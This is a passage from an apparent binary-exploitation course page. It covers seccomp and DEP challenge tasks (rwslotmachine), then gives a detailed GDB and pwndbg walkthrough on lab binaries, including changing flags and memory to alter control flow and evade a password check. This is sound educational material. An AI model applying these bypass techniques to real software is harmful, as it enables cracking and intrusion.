</code></pre><p>In the example above we see a filter operating on the whitelist model: it specifies a subset of syscalls that are allowed: <code>rt_sigreturn</code>, <code>sigreturn</code>, <code>exit_group</code>, <code>exit</code>, <code>open</code>, <code>read</code> and <code>write</code>.</p><p>To install <code>seccomp-tools</code> on the Kali VM, use the the <code>gem</code> package manager:</p><pre tabindex=0><code>$ gem install seccomp-tools
</code></pre><h2 id=challenges>Challenges</h2><p>Challenges can be found in the <code>activities/</code> directory.</p><h3 id=01-04-challenges---rwslotmachine1-4>01-04. Challenges - rwslotmachine[1-4]</h3><p>All of the challenges in this section are intended to be solved with <strong>ASLR enabled</strong>. However, you are free to disable it while developing your exploit for debugging purposes. You are provided with the needed shared libraries from the remote system.</p><p>The challenges are based on the same &ldquo;application&rdquo;: the binaries expose very similar functionality with minimal implementation differences. Your job is to identify the defense mechanisms in use for each of them and bypass them in order to read a flag from the remote system.</p><p>They are numbered in the suggested solving order.</p><p><strong>Tips</strong>:</p><ul><li>Do not waste time on reverse engineering <code>rwslotmachine3</code>! It is very similar to <code>rwslotmachine2</code>, but operates on the client/server model.</li><li>To set <code>LD_LIBRARY_PATH</code> from within a pwntools script, use <code>p = process('./rwslotmachineX', env={'LD_LIBRARY_PATH' : '.'})</code>.</li><li>In the case of <code>rwslotmachine4</code>, you will need the shared library <code>libint.so</code> (found inside of the github repo).</li></ul><h3 id=05-bonus---rwslotmachine5>05. Bonus - rwslotmachine5</h3><p>This challenge is similar to <code>rwslotmachine1</code>. However, your exploit for the first challenge will (most likely) not work. Investigate why and develop a bypass.</p><p><strong>Hint</strong>: You can find a table describing x86 syscalls <a href=https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit>here</a>.</p><h2 id=further-reading>Further Reading</h2><ul><li><a href=https://en.wikipedia.org/wiki/PaX#PAGEEXEC>PaX PAGEEXEC</a></li><li><a href=https://en.wikipedia.org/wiki/PaX#SEGMEXEC>PaX SEGMEXEC</a></li><li><a href=http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Slides-v2.pdf>Black Hat & DEF CON 2010, JIT spraying slides</a>;</li><li><a href=http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Paper.pdf>Interpreter Exploitation. Pointer Inference and JIT Spraying</a>.</li><li><a href=https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention>DEP</a></li><li><a href=https://lwn.net/Articles/593476/>eBPF</a></li></ul></div><div class=td-content style=page-break-before:always><h1 id=pg-17f3b0fdd7357596062ac7d64ac677be>3 -</h1><h1 id=dynamic-analysis>Dynamic Analysis</h1><h2 id=introduction>Introduction</h2><h4 id=objectives--rationale>Objectives & Rationale</h4><p>The first part of this session will give you a walkthrough of the most common GDB principles that we are going to use in exploitation. In the second half, we are going to use these concepts in practice, to evade a basic key evaluation program.</p><p>Black Box type analysis works best when standard algorithms are used in the program, such as: MD5, SHA1,RSA . We can change the input to a more suggestive one and use the output to estimate what function was used to convert it.</p><p>Combined with behavioral analysis methods such as using sandboxes or strace/ltrace we can quickly map sections of code to functionalities.</p><p>With dynamic analysis, packed malware can be extracted from memory in unpacked form, enabling us to continue static analysis on the complete binary.</p><h4 id=prerequisites>Prerequisites</h4><p>In the current session we will use GDB extensively. We assume that you are familiar with its basic usage and will move on quickly to some of its more advanced features.</p><p>To brush up on the GDB basics, read this <a href=https://security.cs.pub.ro/summer-school/wiki/session/04-gdb title=session:04-gdb>Refresher</a>.</p><p>The executable used in the demo is called sppb and is the challenge 1 binary.</p><h6 id=before-gdb>Before GDB</h6><h5 id=one-thing-you-should-always-do-before-firing-up-gdb-is-to-try-to-learn-all-the-available-information-on-the-executable-youre-trying-to-debug-through-the-techniques-that-have-been-presented-so-far>One thing you should always do before firing up GDB is to try to learn all the available information on the executable you're trying to debug through the techniques that have been presented so far.</h5><p>For the purposes of this session it is a good idea to always run<code>objdump</code> on all the executable files before attaching GDB to them so that you have a better idea of what goes where.</p><pre tabindex=0><code class=language-{.code data-lang={.code>$ objdump -M intel -d [executable]
</code></pre><h3 id=gdb-basic-commands>GDB Basic Commands</h3><h4 id=getting-help-with-gdb>Getting help with GDB</h4><p>Whenever you want to find out more information about GDB commands feel free to search for it inside <a href=http://www.gnu.org/software/gdb/documentation/ title=http://www.gnu.org/software/gdb/documentation/>the documentation</a> or by using the <code>help</code> command followed by your area of interest. For example searching for help for the <code>disassemble</code> command can be obtained by running the following command in GDB:</p><pre tabindex=0><code class=language-{.code data-lang={.code>#print info about all help areas available
#identify the area of your question
(gdb) help
#print info about available data commands
#identify the command you want to learn more about
(gdb) help data
#print info about a specific command
#find out more about the command you are searching for
(gdb) help disassemble
</code></pre><h4 id=opening-a-program-with-gdb>Opening a program with GDB</h4><p>A program can be opened for debugging in a number of ways. We can run
GDB directly attaching it to a program:</p><pre tabindex=0><code class=language-{.code data-lang={.code>$ gdb [executable-file]
</code></pre><p>Or we can open up GDB and then specify the program we are trying to
attach to using the file or file-exec command:</p><pre tabindex=0><code class=language-{.code data-lang={.code>$ gdb
(gdb) file [executable-file]
</code></pre><p>Furthermore we can attach GDB to a running service if we know its
process id:</p><pre tabindex=0><code class=language-{.code data-lang={.code>$ gdb --pid [pid_number]
</code></pre><h4 id=disassembling>Disassembling</h4><p>GDB allows disassembling of binary code using the <code>disassemble</code> command
(it may be shortened to <code>disas</code>). The command can be issued either on a
memory address or using labels.</p><pre tabindex=0><code class=language-{.code data-lang={.code>(gdb) disassemble *main
Dump of assembler code for function main:
   0x080491c9 &lt;+0&gt;:     push   ebp
   0x080491ca &lt;+1&gt;:     mov    ebp,esp
   0x080491cc &lt;+3&gt;:     push   ebx
   0x080491cd &lt;+4&gt;:     sub    esp,0x4
=&gt; 0x080491d0 &lt;+7&gt;:     mov    eax,ds:0x804c030
....Output ommited.....
(gdb) disassemble 0x080491c9
Dump of assembler code for function main:
   0x080491c9 &lt;+0&gt;:     push   ebp
   0x080491ca &lt;+1&gt;:     mov    ebp,esp
   0x080491cc &lt;+3&gt;:     push   ebx
   0x080491cd &lt;+4&gt;:     sub    esp,0x4
=&gt; 0x080491d0 &lt;+7&gt;:     mov    eax,ds:0x804c030
</code></pre><h4 id=adding-breakpoints>Adding Breakpoints</h4><p>Breakpoints are important to suspend the execution of the program being debugged in a certain place. Adding breakpoints is done with the <code>break</code>
command. A good idea is to place a breakpoint at the main function of the program you are trying to exploit. Given the fact that you have already run <code>objdump</code> and disassembled the program you know the address for the start of the main function. This means that we can set a
breakpoint for the start of our program in two ways:</p><pre tabindex=0><code class=language-{.code data-lang={.code>(gdb) break *main (when the binary is not stripped of symbols)
(gdb) break *0x[main_address_obtained_with_objdump] (when aslr is off)
</code></pre><p>The general format for setting breakpoints in GDB is as follows:</p><pre tabindex=0><code class=language-{.code data-lang={.code>(gdb) break [LOCATION] [thread THREADNUM] [if CONDITION]
</code></pre><p><em>Issuing the <code>break</code> command with no parameters will place a breakpoint</em> <em>at the current address.</em></p><p><em>GDB allows using abbreviated forms for all the commands it supports. Learning these abbreviations comes with time and will greatly improve you work output. Always be on the lookout for using abbreviated commands.</em></p><p>The abbreviated command for setting breakpoints is simply <code>b</code>.</p><h4 id=listing-breakpoints>Listing Breakpoints</h4><p>At any given time all the breakpoints in the program can be displayed using the <code>info breakpoints</code> command:</p><pre tabindex=0><code class=language-{.code data-lang={.code>(gdb) info breakpoints
</code></pre><p><em>You can also issue the abbreviated form of the command</em></p><pre tabindex=0><code class=language-{.code data-lang={.code>(gdb) i b
</code></pre><h4 id=deleting-breakpoints>Deleting Breakpoints</h4><p>Breakpoints can be removed by issuing the <code>delete breakpoints</code> command followed by the breakpoints number, as it is listed in the output of the
<code>info breakpoints</code> command.</p><pre tabindex=0><code class=language-{.code data-lang={.code>(gdb) delete breakpoints [breakpoint_number]
</code></pre><p><em>You can also delete all active breakpoints by issuing the following the</em> <code>delete breakpoints</code> command with no parameters:*</p><pre tabindex=0><code class=language-{.code data-lang={.code>(gdb) delete breakpoints
</code></pre><p>Once a breakpoint is set you would normally want to launch the program into execution. You can do this by issuing the <code>run</code> command. The program will start executing and stop at the first breakpoint you have
set.</p><pre tabindex=0><code class=language-{.code data-lang={.code>(gdb) run
</code></pre><h4 id=execution-flow>Execution flow</h4><p>Execution flow can be controlled in GDB using the <code>continue</code>, <code>stepi</code>,<code>nexti</code> as follows:</p><pre tabindex=0><code class=language-{.code data-lang={.code>(gdb) help continue
#Continue program being debugged, after signal or breakpoint.
#If proceeding from breakpoint, a number N may be used as an argument,
#which means to set the ignore count of that breakpoint to N - 1 (so that
#the breakpoint won&#39;t break until the Nth time it is reached).
(gdb) help stepi
#Step one instruction exactly.
#Argument N means do this N times (or till program stops for another reason).
(gdb) help nexti
#Step one instruction, but proceed through subroutine calls.
#Argument N means do this N times (or till program stops for another reason).
</code></pre><p><em>You can also use the abbreviated format of the commands: <code>c</code></em>
<em>(<code>continue</code>), <code>si</code> (<code>stepi</code>), <code>ni</code> (<code>nexti</code>).</em></p><p><em>If at any point you want to start the program execution from the</em> <em>beginning you can always reissue the <code>run</code> command.</em></p><p>Another technique that can be used for setting breakpoints is using offsets.</p><p>As you already know, each assembly instruction takes a certain number of bytes inside the executable file. This means that whenever you are setting breakpoints using offsets you must always set them at instruction boundaries.</p><pre tabindex=0><code class=language-{.code data-lang={.code>(gdb) break *main
Breakpoint 1 at 0x80491d0
(gdb) run
Starting program: sppb
 
Breakpoint 1, 0x80491d0 in main ()
(gdb) disassemble main
Dump of assembler code for function main:
   0x080491c9 &lt;+0&gt;:     push   ebp
   0x080491ca &lt;+1&gt;:     mov    ebp,esp
   0x080491cc &lt;+3&gt;:     push   ebx
   0x080491cd &lt;+4&gt;:     sub    esp,0x4
.....Output ommited.....
(gdb) break *main+4
Breakpoint 2 at 0x80491cd
</code></pre><h3 id=examine-and-print-your-most-powerful-tools>Examine and Print, your most powerful tools</h3><p>GDB allows examining of memory locations be them specified as addresses or stored in registers. The <code>x</code> command (for <em>examine</em>) is arguably one
of the most powerful tool in your arsenal and the most common command you are going to run when exploiting.</p><p>The format for the <code>examine</code> command is as follows:</p><pre tabindex=0><code class=language-{.code data-lang={.code>(gdb) x/nfu [address]
        n:  How many units to print
        f:  Format character
              a Pointer
              c Read as integer, print as character
              d Integer, signed decimal
              f Floating point number
              o Integer, print as octal
              s Treat as C string (read all successive memory addresses until null character and print as characters)
              t Integer, print as binary (t=&#34;two&#34;)
              u Integer, unsigned decimal
              x Integer, print as hexadecimal
        u:  Unit
              b: Byte
              h: Half-word (2 bytes)
              w: Word (4 bytes)
              g: Giant word (8 bytes)
              i: Instruction (read n assembly instructions from the specified memory address)
</code></pre><p>In contrast with the examine command, which reads data at a memory location the <code>print</code> command (shorthand <code>p</code>) prints out values stored in
registers and variables.</p><p>The format for the <code>print</code> command is as follows:</p><pre tabindex=0><code class=language-{.code data-lang={.code>(gdb) p/f [what]
        f:  Format character
              a Pointer
              c Read as integer, print as character
              d Integer, signed decimal
              f Floating point number
              o Integer, print as octal
              s Treat as C string (read all successive memory addresses until null character and print as characters)
              t Integer, print as binary (t=&#34;two&#34;)
              u Integer, unsigned decimal
              x Integer, print as hexadecimal
              i Instruction (read n assembly instructions from the specified memory address)
</code></pre><p>For a better explanation please follow through with the following example:</p><pre tabindex=0><code class=language-{.code data-lang={.code>#a breakpoint has been set inside the program and the program has been run with the appropriate commands to reach the breakpoint
#at this point we want to see which are the following 10 instructions
(gdb) x/10i 0x80491cd
   0x80491cd &lt;main+4&gt;:  sub    esp,0x4
   0x80491d0 &lt;main+7&gt;:  mov    eax,ds:0x804c030
   0x80491d5 &lt;main+12&gt;: push   0x0
   0x80491d7 &lt;main+14&gt;: push   0x1
   0x80491d9 &lt;main+16&gt;: push   0x0
   0x80491db &lt;main+18&gt;: push   eax
   0x80491dc &lt;main+19&gt;: call   0x8049080 &lt;setvbuf@plt&gt;
#let&#39;s examine the memory at 0x804a02a because we have a hint that this address holds one of the parameters of the scanf call  as it is afterwards placed on the stack (we&#39;ll explain later how we have reached this conclusion)
#the other parameter will be an address where the input will be stored
(gdb) x/s 0x804a02a
0x804a02a:      &#34;%d&#34;
# we now set a breakpoint for *main+56
(gdb) break *0x08049201
Breakpoint 3 at 0x08049201
(gdb) continue
Continuing.
 
Breakpoint 3, 0x08049201 in main ()
We then record the value of the eax register somewhere and use nexti(ni) and then we input an integer.
#let&#39;s examine the address which we recorded earlier corresponding to the eax register (it should&#39;ve held the address for the integer we input)
#take note that in GDB registers are preceded by the &#34;$&#34; character very much like variables
(gdb) x/d 0xffffcf70 &lt;- (your address)
0xffffcf70:     &lt;your input&gt;
#now let&#39;s print the contents of the eax register as hexadecimal
(gdb) p/x $eax
$1 = &lt;your input&gt;

The diference between p and x can be observed by issuing the following commands:
x/s 0x804a030
0x804a030:      &#34;Your password is: %d. Evaluating it...\n&#34;

p /s 0x804a030

$2 = 1920298841 which is the number in decimal format that &#34;Your&#34; can be translated to by its ascii codes (little endian so written as 0x72756F59).

In order to see the same result we must use the command p /s (char*)0x804a030 and dereference the pointer ourselves 
# as you can see the address holds the memory for the beginning of the string
# this shows you how &#34;x&#34; interprets data from memory while &#34;p&#34; merely prints out the contents in the required format
# you can think of it as &#34;x&#34; dereferencing while &#34;p&#34; not dereferencing
</code></pre><h3 id=gdb-command-file>GDB command file</h3><p>When exploiting, there are a couple of commands that you will issue periodically and doing that by hand will get cumbersome. GDB commands
files will allow you to run a specific set of commands automatically after each command you issue manually. This comes in especially handy
when you're stepping through a program and want to see what happens with the registers and stack after each instruction is ran, which is the
main target when exploiting.</p><p>The examine command only has sense when code is already running on the machine so inside the file we are going to use the display command which
translates to the same output.</p><p>In order to use this option you must first create your commands file. This file can include any GDB commands you like but a good start would
be printing out the content of all the register values, the next ten instructions that are going to be executed, and some portion from the
top of the stack.</p><p>The reason for examining all of the above after each instruction is ran will become more clear once the we go through the second section of the
session.</p><p>Command file template:</p><pre tabindex=0><code class=language-{.code data-lang={.code>display/10i $eip
display/x $eax
display/x $ebx
display/x $ecx
display/x $edx
display/x $edi
display/x $esi
display/x $ebp
display/32xw $esp
</code></pre><p>In order to view all register values you could use the <code>x</code> command.
However the values of all registers can be obtained by running the<code>info all-registers</code> command:</p><pre tabindex=0><code class=language-{.code data-lang={.code>(gdb) info all-registers
eax            0x8048630,134514224
ecx            0xbffff404,-1073744892
edx            0xbffff394,-1073745004
ebx            0xb7fc6ff4,-1208193036
esp            0xbffff330,0xbffff330
ebp            0xbffff368,0xbffff368
esi            0x0,0
edi            0x0,0
eip            0x80484e9,0x80484e9 &lt;main+37&gt;
eflags         0x286,[ PF SF IF ]
cs             0x73,115
ss             0x7b,123
ds             0x7b,123
es             0x7b,123
fs             0x0,0
gs             0x33,51
st0            *value not available*
st1            *value not available*
st2            *value not available*
st3            *value not available*
st4            *value not available*
st5            *value not available*
st6            *value not available*
st7            *value not available*
fctrl          0x37f,895
fstat          0x0,0
ftag           0xffff,65535
fiseg          0x0,0
fioff          0x0,0
foseg          0x0,0
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
fooff          0x0,0
fop            0x0,0
mxcsr          0x1f80,[ IM DM ZM OM UM PM ]
ymm0           *value not available*
ymm1           *value not available*
ymm2           *value not available*
ymm3           *value not available*
ymm4           *value not available*
ymm5           *value not available*
ymm6           *value not available*
ymm7           *value not available*
mm0            *value not available*
mm1            *value not available*
mm2            *value not available*
mm3            *value not available*
mm4            *value not available*
mm5            *value not available*
mm6            *value not available*
mm7            *value not available*
</code></pre><p><em>One thing you might notice while using GDB is that addresses seem to be pretty similar between runs. Although with experience you will gain a better feel for where an address points to, one thing to remember at this point would be that stack addresses usually have the <code>0xbffff….</code> format. In order to run GDB with the commands file you have just generated, when launching GDB specify the <code>-x [command_file]</code> parameter.</em></p><h3 id=using-gdb-to-modify-variables>Using GDB to modify variables</h3><p>GDB can be used to modify variables during runtime. In the case of exploitation this comes in handy as the program can be altered at
runtime with the purpose of changing the execution path to desired branches.</p><h3 id=pwndbg>PWNDBG</h3><p>As you can see using GDB can be cumbersome, this is why we recommend using the pwndbg plug-in. The tutorial as well as the repository of the project can be found here <a href=https://github.com/pwndbg/pwndbg title=https://github.com/pwndbg/pwndbg>Pwndbg</a></p><p>Give the fact that pwndbg is just a wrapper, all the functionality of GDB will be available when running gdb with the<code>pwndbg</code> plug-in. Some of the advantages of using pwngdb include:</p><ol><li>Automatic preview of registers, code and stack after each instruction (you no longer need to create your own commands file)</li><li>Automatic dereferencing and following through of memory locations</li><li>Color coding</li></ol><p>An alternative to pwndbg is <a href=https://github.com/hugsy/gef title=https://github.com/hugsy/gef>Gef</a>. However, this tutorial is designed with Pwndbg in mind.</p><h4 id=pwndbg-commands>PWNDBG Commands</h4><p><code>pdis</code> command gives a pretty output that is similar to what the <code>disas</code>
command in GDB prints:</p><pre tabindex=0><code class=language-{.code data-lang={.code>Usage:  pdis 0x80491d0
</code></pre><p>If <code>pdis</code> is used with an address as a parameter, the output will be similar to what <code>x/Ni</code> prints out (where N is the number of instructions you want to disassemble) Usage: -pdis [address] [N] - where N is the number of instructions you want to be printed</p><p>The <code>stepi</code> command has the same effect as in GDB however, if you are running PWNDBG you will notice that after each step PWNDBG will automatically print register values, several lines of code from eip
register and a portion of the stack:</p><pre tabindex=0><code class=language-{.code data-lang={.code>pwndbg&gt; stepi

LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────[ REGISTERS ]────────────────────────────────────
*EAX  0xf7facd20 (_IO_2_1_stdout_) ◂— 0xfbad2084
 EBX  0x0
 ECX  0xa00af61b
 EDX  0xffffcfb4 ◂— 0x0
 EDI  0xf7fac000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c
 ESI  0xf7fac000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c
 EBP  0xffffcf78 ◂— 0x0
 ESP  0xffffcf70 —▸ 0xf7fac000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c
*EIP  0x80491d5 (main+12) ◂— push   0 /* &#39;j&#39; */
─────────────────────────────────────[ DISASM ]──────────────────────────────────────
   0x80491d0 &lt;main+7&gt;     mov    eax, dword ptr [stdout@GLIBC_2.0] &lt;0x804c030&gt;
 ► 0x80491d5 &lt;main+12&gt;    push   0
   0x80491d7 &lt;main+14&gt;    push   1
   0x80491d9 &lt;main+16&gt;    push   0
   0x80491db &lt;main+18&gt;    push   eax
   0x80491dc &lt;main+19&gt;    call   setvbuf@plt &lt;setvbuf@plt&gt;
 
   0x80491e1 &lt;main+24&gt;    add    esp, 0x10
   0x80491e4 &lt;main+27&gt;    mov    dword ptr [ebp - 8], 0
   0x80491eb &lt;main+34&gt;    push   0x804a010
   0x80491f0 &lt;main+39&gt;    call   puts@plt &lt;puts@plt&gt;
 
   0x80491f5 &lt;main+44&gt;    add    esp, 4
──────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────
In file: /home/kali/Desktop/dokermaker/binary-internal/sessions/05-dynamic-analysis/activities/01-02-challenge-sppb/src/sppb.c
    6   execve(&#34;/bin/sh&#34;, 0, 0);
    7 }
    8 
    9 int main()
   10 {
 ► 11   setvbuf(stdout, NULL, _IOLBF, 0);
   12   int readValue = 0;
   13 
   14   printf(&#34;Please provide password: \n&#34;);
   15   scanf(&#34;%d&#34;, &amp;readValue);
   16 
──────────────────────────────────────[ STACK ]──────────────────────────────────────
00:0000│ esp 0xffffcf70 —▸ 0xf7fac000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c
01:0004│     0xffffcf74 ◂— 0x0
02:0008│ ebp 0xffffcf78 ◂— 0x0
03:000c│     0xffffcf7c —▸ 0xf7de0fd6 (__libc_start_main+262) ◂— add    esp, 0x10
04:0010│     0xffffcf80 ◂— 0x1
05:0014│     0xffffcf84 —▸ 0xffffd024 —▸ 0xffffd1d9 ◂— &#39;/home/kali/Desktop/sppb&#39;
06:0018│     0xffffcf88 —▸ 0xffffd02c —▸ 0xffffd24d ◂— &#39;COLORFGBG=15;0&#39;
07:001c│     0xffffcf8c —▸ 0xffffcfb4 ◂— 0x0
────────────────────────────────────[ BACKTRACE ]────────────────────────────────────
 ► f 0 0x80491d5 main+12
   f 1 0xf7de0fd6 __libc_start_main+262
</code></pre><p>You can always use the following commands to obtain context at any given
moment inside the debug process:</p><ol><li><code>context reg</code></li><li><code>context code</code></li><li><code>context stack</code></li><li><code>context all</code></li></ol><p>One additional PWNDBG command which can be used to show values in registers is the <code>telescope</code> command. The command dereferentiates pointer values until it gets to a value and prints out the entire trace.</p><p>The command can be used with both registers and memory addresses:</p><pre tabindex=0><code class=language-{.code data-lang={.code>pwndbg$ telescope $esp
00:0000│ esp 0xffffcf70 —▸ 0xf7fac000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c
01:0004│     0xffffcf74 ◂— 0x0
02:0008│ ebp 0xffffcf78 ◂— 0x0
03:000c│     0xffffcf7c —▸ 0xf7de0fd6 (__libc_start_main+262) ◂— add    esp, 0x10
04:0010│     0xffffcf80 ◂— 0x1
05:0014│     0xffffcf84 —▸ 0xffffd024 —▸ 0xffffd1d9 ◂— &#39;/home/kali/Desktop/sppb&#39;
06:0018│     0xffffcf88 —▸ 0xffffd02c —▸ 0xffffd24d ◂— &#39;COLORFGBG=15;0&#39;
07:001c│     0xffffcf8c —▸ 0xffffcfb4 ◂— 0x0
pwndbg&gt; telescope 0xffffcf84
00:0000│  0xffffcf84 —▸ 0xffffd024 —▸ 0xffffd1d9 ◂— &#39;/home/kali/Desktop/sppb&#39;
01:0004│  0xffffcf88 —▸ 0xffffd02c —▸ 0xffffd24d ◂— &#39;COLORFGBG=15;0&#39;
02:0008│  0xffffcf8c —▸ 0xffffcfb4 ◂— 0x0
03:000c│  0xffffcf90 —▸ 0xffffcfc4 ◂— 0xe38ae80b
04:0010│  0xffffcf94 —▸ 0xf7ffdb60 —▸ 0xf7ffdb00 —▸ 0xf7fc93e0 —▸ 0xf7ffd9a0 ◂— ...
05:0014│  0xffffcf98 —▸ 0xf7fc9410 —▸ 0x804832d ◂— &#39;GLIBC_2.0&#39;
06:0018│  0xffffcf9c —▸ 0xf7fac000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c
07:001c│  0xffffcfa0 ◂— 0x1
</code></pre><p>In the example above, the memory address 0x8048630 was loaded into EAX. That is why examining the register or the memory location gives the same output.</p><p>For more information on various PWNdbg commands you can always visit the PWNdbg help through the <code>pwndbg</code> command It is always a better idea to use PWNdbg commands when available. However you should also know the basics of using GDB as well.</p><h4 id=altering-variables-and-memory-with-pwndbg-and-gdb>Altering variables and memory with PWNdbg and GDB</h4><p>In addition to basic registers, GDB has a two extra variables which map onto some of the existing registers, as follows:</p><ul><li><p><code>$pc – $eip</code></p></li><li><p><code>$sp – $esp</code></p></li><li><p><code>$fp – $ebp</code></p></li></ul><p>In addition to these there are also two registers which can be used to view the processor state <code>$ps – processor status</code></p><p>Values of memory addresses and registers can be altered at execution time. Because altering memory is a lot easier using PWNdbg we are going to
use it throughout today's session.</p><p>The easiest way of altering the execution flow of a program is editing the <code>$eflags</code> register just before jump instructions.</p><p>Using GDB the <code>$eflags</code> register can be easily modified:</p><pre tabindex=0><code class=language-{.code data-lang={.code>pwndbg&gt; reg eflags
EFLAGS 0x282 [ cf pf af zf SF IF df of ]
Set the ZF flag
pwndbg&gt; set $eflags |= (1 &lt;&lt; 6)
Clear the ZF flag
pwndbg&gt; set $eflags &amp;= ~(1 &lt;&lt; 6)
</code></pre><p>Notice that the flags that are set are printed in all-caps when the<code>reg eflags</code> command is issued.</p><p>The <code>set</code> command (GDB native) can be used to modify values that reside inside memory.</p><pre tabindex=0><code class=language-{.code data-lang={.code>pwndbg&gt; telescope 0x804a010
00:0000│  0x804a010 ◂— &#39;Please provide password: &#39;
01:0004│  0x804a014 ◂— &#39;se provide password: &#39;
02:0008│  0x804a018 ◂— &#39;rovide password: &#39;
03:000c│  0x804a01c ◂— &#39;de password: &#39;
04:0010│  0x804a020 ◂— &#39;assword: &#39;
05:0014│  0x804a024 ◂— &#39;ord: &#39;
06:0018│  0x804a028 ◂— 0x64250020 /* &#39; &#39; */
07:001c│  0x804a02c ◂— 0x0

pwndbg&gt; set {char [14]} 0x804a010 = &#34;No pass here&#34;
Written 28 bytes to 0x8048630
pwndbg&gt; telescope 0x8048630
00:0000│  0x804a010 ◂— &#39;No pass here&#39;
01:0004│  0x804a014 ◂— &#39;ass here&#39;
02:0008│  0x804a018 ◂— &#39;here&#39;
03:000c│  0x804a01c ◂— 0x70200000
04:0010│  0x804a020 ◂— &#39;assword: &#39;
05:0014│  0x804a024 ◂— &#39;ord: &#39;
06:0018│  0x804a028 ◂— 0x64250020 /* &#39; &#39; */
07:001c│  0x804a02c ◂— 0x0
</code></pre><p>As you can see the string residing in memory at address <code>0x8048630</code> has been modified using the <code>set</code> command.</p><p>Pwngdb does not offer enhancements in modifying registry values. For modifying registry values you can use the GDB <code>set</code> command.</p><pre tabindex=0><code class=language-{.code} data-lang={.code}>pwngdb&gt; p/x $eax
$10 = 0x1
pwngdb&gt; set $eax=0x80
pwngdb&gt; p/x $eax
$11 = 0x80
</code></pre><h3 id=enough-with-gdb-for-a-while>Enough with GDB (for a while)</h3><p>The following section will describe the process of function calling in detail. Understanding function calling and stack operations during program execution is esential to exploitation.</p><h3 id=the-stack>The Stack</h3><p>The stack is one of the areas of memory which gets the biggest attention in exploitation writing.</p><h4 id=stack-growth>Stack Growth</h4><p>The stack grows from high memory addresses to low memory addresses.</p><pre tabindex=0><code class=language-{.code data-lang={.code>pwndbg&gt;  pdis $eip

   0x80491db &lt;main+18&gt;    push   eax
   0x80491dc &lt;main+19&gt;    call   setvbuf@plt &lt;setvbuf@plt&gt;
 
   0x80491e1 &lt;main+24&gt;    add    esp, 0x10
   0x80491e4 &lt;main+27&gt;    mov    dword ptr [ebp - 8], 0
   0x80491eb &lt;main+34&gt;    push   0x804a010
 ► 0x80491f0 &lt;main+39&gt;    call   puts@plt &lt;puts@plt&gt;

pwndbg&gt; p/x $esp
$1 = 0xffffcf6c
pwndbg&gt; si
0x8049050 in puts@plt ()
pwndbg&gt; p/x $esp
$5 = 0xffffcf68
</code></pre><p>As you can see from the example above the $esp register had an initial value of <code>0xffffcf6c</code>. The next instruction that is about to be executed is a push (it pushes <code>0x0</code> on the stack). We execute the instruction and then reevaluate the value of <code>$esp</code>. As we can see <code>$esp</code> now points to <code>0xffffcf68</code> (<code>0xffffcf6c-0x4</code>).</p><h4 id=frame-pointers-and-local-function-variables>Frame pointers and local function variables</h4><p>Whenever the processor is entering the execution for a function, a special logical container is created on the stack for that function.</p><p>This container is called a function frame. The idea behind it is that the processor must know which area of the stack belongs to which function.</p><p>In order to achieve this logical segmentation a set of 2 instructions are automatically inserted by the compiler at the beginning of each function. Can you tell what they are based on the output below?</p><pre tabindex=0><code class=language-{.code data-lang={.code>pwndbg&gt; break main
Breakpoint 1 at 0x80484c8
pwndbg&gt; run
[----------------------------------registers-----------------------------------]
 EAX  0xf7fa99e8 (environ) —▸ 0xffffd02c —▸ 0xffffd24d ◂— &#39;COLORFGBG=15;0&#39;
 EBX  0x0
 ECX  0xb8a6a751
 EDX  0xffffcfb4 ◂— 0x0
 EDI  0x80490a0 (_start) ◂— xor    ebp, ebp
 ESI  0x1
 EBP  0xffffcf78 ◂— 0x0
 ESP  0xffffcf70 ◂— 0x1
 EIP  0x80491d0 (main+7) ◂— mov    eax, dword ptr [0x804c030]
[-------------------------------------code-------------------------------------]
   0x080491c9 &lt;+0&gt;:     push   ebp
   0x080491ca &lt;+1&gt;:     mov    ebp,esp
   0x080491cc &lt;+3&gt;:     push   ebx
   0x080491cd &lt;+4&gt;:     sub    esp,0x4
=&gt; 0x080491d0 &lt;+7&gt;:     mov    eax,ds:0x804c030
   0x080491d5 &lt;+12&gt;:    push   0x0
   0x080491d7 &lt;+14&gt;:    push   0x1
   0x080491d9 &lt;+16&gt;:    push   0x0
   0x080491db &lt;+18&gt;:    push   eax

[------------------------------------stack-------------------------------------]
00:0000│ esp 0xffffcf70 ◂— 0x1
01:0004│     0xffffcf74 ◂— 0x0
02:0008│ ebp 0xffffcf78 ◂— 0x0
03:000c│     0xffffcf7c —▸ 0xf7dda905 (__libc_start_main+229) ◂— add    esp, 0x10
04:0010│     0xffffcf80 ◂— 0x1
05:0014│     0xffffcf84 —▸ 0xffffd024 —▸ 0xffffd1d9 ◂— &#39;/home/kali/Desktop/sppb&#39;
06:0018│     0xffffcf88 —▸ 0xffffd02c —▸ 0xffffd24d ◂— &#39;COLORFGBG=15;0&#39;
07:001c│     0xffffcf8c —▸ 0xffffcfb4 ◂— 0x0

[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
 
Breakpoint 1, 0x080491d0 in main ()
pwndbg&gt;  disass password_accepted


   0x080491b2 &lt;+0&gt;:     push   ebp                                                   
   0x080491b3 &lt;+1&gt;:     mov    ebp,esp                                               
   0x080491b5 &lt;+3&gt;:     push   0x0
   0x080491b7 &lt;+5&gt;:     push   0x0
   0x080491b9 &lt;+7&gt;:     push   0x804a008
   0x080491be &lt;+12&gt;:    call   0x8049070 &lt;execve@plt&gt;
   0x080491c3 &lt;+17&gt;:    add    esp,0xc
   0x080491c6 &lt;+20&gt;:    nop
   0x080491c7 &lt;+21&gt;:    leave  
   0x080491c8 &lt;+22&gt;:    ret 
